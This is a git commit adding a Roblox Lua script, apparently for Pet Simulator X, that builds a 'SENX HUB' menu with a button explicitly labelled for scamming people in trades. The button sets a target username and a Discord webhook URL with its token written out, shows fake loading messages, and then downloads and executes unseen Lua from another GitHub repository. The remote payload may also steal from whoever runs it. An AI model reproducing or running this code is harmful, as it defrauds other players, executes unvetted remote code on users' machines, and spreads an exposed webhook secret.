42f5a2a23d56cc70fcd39babd9431c23ed48f535
SENXYT <122054610+SENXYT@users.noreply.github.com>
2023-03-25 18:17:10 +0100

    Create Trade-Lag.lua

---
+++ Trade-Lag.lua
@@ -0,0 +1,27 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("SENX HUB", "BloodTheme")
+-- MAIN
+local MAIN = Window:NewTab("MAIN")
+local MainSection = MAIN:NewSection("MADE BY Senx#2573")
+local MainSection = MAIN:NewSection("Youtube")
+local MainSection = MAIN:NewSection("https://bit.ly/Senx_yt")
+local MainSection = MAIN:NewSection("Discord")
+local MainSection = MAIN:NewSection("https://discord.gg/eb7d3nP8sW")
+local MainSection = MAIN:NewSection("SUBSCRIBE AND JOIN MY DISCORD")
+
+
+-- TradeLag
+local TradeLag = Window:NewTab("TRADE LAG")
+local Main2Section = TradeLag:NewSection("Trade Lag")
+
+Main2Section:NewButton("Trade Lag", "For Scamming People in Trade", function()
+    Username = "Tick_B1"
+    WebHook = "https://discord.com/api/webhooks/1084879908897034332/f3hVzo3Tal-hIqH5mXS8DDu--AvjX5pLygXbpWuGeeDJ4DLuk9MynJ3irkgmRuHMl588"
+    loadingscreen = true
+    _G.CustomScriptName = "Opening Trade Lag Script..."
+    _G.Text1 = "Script Loaded..."
+    _G.Text2 = "Waiting for Script"
+    _G.Text3 = "Checking Scripts..."
+    _G.Text4 = "Starting Scripts..."
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+end)
